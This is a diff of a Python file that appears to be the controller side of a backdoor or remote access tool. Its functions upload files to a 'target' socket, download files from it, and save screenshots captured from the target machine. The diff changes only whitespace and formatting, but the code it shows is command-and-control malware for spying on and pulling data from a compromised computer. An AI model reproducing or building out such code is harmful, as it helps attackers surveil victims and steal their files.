@@ -23,6 +23,7 @@ def upload_file(file_name):
     f = open(file_name, 'rb')
     target.send(f.read())
 
+
 def download_file(file_name):
     f = open(file_name, 'wb')
     target.settimeout(1)
@@ -35,6 +36,7 @@ def download_file(file_name):
             break
     target.settimeout(None)
     f.close()
+
 
 def target_communication():
     count = 0
@@ -52,7 +54,7 @@ def target_communication():
         elif command[:8] == 'download':
             download_file(command[9:])
         elif command[:10] == 'screenshot':
-            f = open('screenshot%d' % (count) , 'wb')
+            f = open('screenshot%d' % (count), 'wb')
             target.settimeout(5)
             chunk = target.recv(1024)
             while chunk:
